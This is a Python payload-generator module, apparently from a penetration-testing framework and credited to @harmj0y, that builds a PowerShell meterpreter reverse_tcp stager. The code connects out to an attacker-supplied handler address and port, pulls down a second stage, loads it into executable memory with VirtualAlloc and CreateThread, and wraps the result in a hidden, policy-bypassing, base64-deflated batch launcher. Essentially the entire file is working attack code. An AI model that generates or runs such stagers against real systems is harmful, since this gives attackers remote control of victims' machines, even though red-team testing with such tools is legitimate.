"""

Custom-written pure powershell meterpreter/reverse_tcp stager.

Module @harmj0y

"""

from modules.common import helpers


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "bat"

        # optional
        self.required_options = {
                                    "LHOST" : ["", "IP of the Metasploit handler"],
                                    "LPORT" : ["4444", "Port of the Metasploit handler"]
                                }


    def generate(self):

        baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
"@
try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect('%s', %s) | out-null; $p = [Array]::CreateInstance("byte", 4); $x = $s.Receive($p) | out-null; $z = 0
$y = [Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5); $y[0] = 0xBF
while ($z -lt [BitConverter]::ToInt32($p,0)) { $z += $s.Receive($y,$z+5,1,[System.Net.Sockets.SocketFlags]::None) }
for ($i=1; $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([int]$s.Handle)[$i-1]}
$t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru; $x=$t::VirtualAlloc(0,$y.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
$t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(self.required_options["LHOST"][0], self.required_options["LPORT"][0])

        print baseString
        encoded = helpers.deflate(baseString)

        payloadCode = "@echo off\n"
        payloadCode += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
        payloadCode += ") else ("
        payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)

        return payloadCode
